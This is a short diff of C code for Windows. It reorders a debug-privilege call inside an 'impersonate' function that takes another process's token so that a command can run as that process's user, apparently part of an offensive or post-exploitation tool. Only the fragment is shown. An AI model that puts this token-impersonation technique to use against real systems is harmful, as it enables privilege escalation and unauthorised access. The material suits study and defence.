@@ -275,12 +275,12 @@ WCHAR* convertToWCHAR(const char* charArray) {
 }
 
 char *impersonate(int pid, char *command){
+    char *enableDebug = enableDebugPrivilege();
     char *firstUser = getName();
     STARTUPINFO startupInfo;
     PROCESS_INFORMATION processInformation;
     startupInfo.cb = sizeof(STARTUPINFO);
     HANDLE hToken = getPrimaryTokenFromProcess(pid);
-    char *enableDebug = enableDebugPrivilege();
     char *open = "[-] Failed to obtain duplicated token.\r\n";
     char *newUser = getName();
     char *impersonation = "[+] Impersonation successfull.\r\n";
